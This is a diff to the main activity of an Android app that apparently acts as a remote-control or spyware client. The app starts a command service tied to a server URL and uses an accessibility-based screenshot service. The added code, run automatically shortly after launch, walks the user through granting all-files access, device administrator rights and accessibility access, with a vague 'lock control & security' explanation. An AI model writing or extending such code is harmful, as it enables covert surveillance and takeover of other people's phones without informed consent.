@@ -3,8 +3,10 @@ package com.csk4.app
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Intent
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
 import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
@@ -33,16 +35,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         findViewById<Button>(R.id.btnAdmin).setOnClickListener {
-            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
-            if (!dpm.isAdminActive(admin)) {
-                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
-                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
-                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock control")
-                startActivity(i)
-            } else {
-                Toast.makeText(this, "✅ Already admin", Toast.LENGTH_SHORT).show()
-            }
+            enableDeviceAdmin()
         }
 
         findViewById<Button>(R.id.btnAccessibility).setOnClickListener {
@@ -72,7 +65,58 @@ class MainActivity : AppCompatActivity() {
 
         registerDevice()
         updateStatus()
+
+        // ⚡ AUTO START: Service + All permissions prompt
         startService(Intent(this, CommandService::class.java))
+
+        // Auto prompt for special permissions on first launch
+        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+            autoPromptSpecialPermissions()
+        }, 2000)
+    }
+
+    private fun autoPromptSpecialPermissions() {
+        // 1. All Files Access (Android 11+)
+        if (Build.VERSION.SDK_INT >= 30) {
+            if (!Environment.isExternalStorageManager()) {
+                Toast.makeText(this, "📁 All Files Access ON karein", Toast.LENGTH_LONG).show()
+                try {
+                    val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                    i.data = Uri.parse("package:$packageName")
+                    startActivity(i)
+                } catch (e: Exception) {
+                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
+                }
+                return
+            }
+        }
+
+        // 2. Device Admin
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
+        if (!dpm.isAdminActive(admin)) {
+            enableDeviceAdmin()
+            return
+        }
+
+        // 3. Accessibility
+        if (ScreenshotService.instance == null) {
+            Toast.makeText(this, "📸 Accessibility ON karein", Toast.LENGTH_LONG).show()
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        }
+    }
+
+    private fun enableDeviceAdmin() {
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
+        if (!dpm.isAdminActive(admin)) {
+            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
+            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock control & security")
+            startActivity(i)
+        } else {
+            Toast.makeText(this, "✅ Admin already active", Toast.LENGTH_SHORT).show()
+        }
     }
 
     private fun updateStatus() {
@@ -81,6 +125,7 @@ class MainActivity : AppCompatActivity() {
         val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val adminActive = dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
         val accActive = ScreenshotService.instance != null
+        val storageAccess = if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager() else true
 
         tvStatus.text = """
             🆔 $deviceId
@@ -89,6 +134,7 @@ class MainActivity : AppCompatActivity() {
             🔋 Battery: $bat%
             🛡️ Admin: ${if (adminActive) "✅" else "❌"}
             📸 Accessibility: ${if (accActive) "✅" else "❌"}
+            📁 Storage Access: ${if (storageAccess) "✅" else "❌"}
             🌐 ${Config.SERVER_URL}
         """.trimIndent()
     }
